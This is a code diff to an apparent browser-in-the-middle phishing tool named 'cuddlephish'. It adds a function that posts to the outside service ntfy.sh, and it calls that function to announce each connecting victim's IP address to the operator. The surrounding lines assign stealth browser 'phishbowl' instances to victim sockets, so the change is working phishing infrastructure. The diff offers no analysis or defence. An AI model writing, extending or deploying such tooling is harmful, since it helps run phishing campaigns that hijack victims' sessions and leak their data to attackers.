@@ -11,6 +11,7 @@ import UserAgentOverride from 'puppeteer-extra-plugin-stealth/evasions/user-agen
 import resize_window from './resize_window.js'
 import replace from 'stream-replace'
 import Xvfb from 'xvfb'
+import https from 'https'
 
 //import admin config
 const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
@@ -55,6 +56,26 @@ var ship_logs = function(log_data){
     //console.log("Error:" + err.response.body)
     return
   })
+}
+
+var nfty_notify = function(notif){
+  if(config.nfty_topic == undefined || config.length == 0)
+    return
+
+  var options = {
+    hostname: 'ntfy.sh',
+    port: 443,
+    path: '/' + config.nfty_topic,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Content-Length': notif.length
+    }
+  }
+  
+  var req = https.request(options, (res) => {})
+  req.write(notif)
+  req.end()
 }
 
 const fastify = Fastify({
@@ -355,6 +376,7 @@ fastify.ready(async function(err){
       empty_phishbowl.victim_target_id = target_id
       empty_phishbowl.victim_width = viewport_width
       empty_phishbowl.victim_height = viewport_height
+      nfty_notify('[cuddlephish] Client connected: ' + client_ip)
       await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
       await empty_phishbowl.target_page.setViewport({width: viewport_width, height: viewport_height})
       empty_phishbowl.victim_socket = socket.id
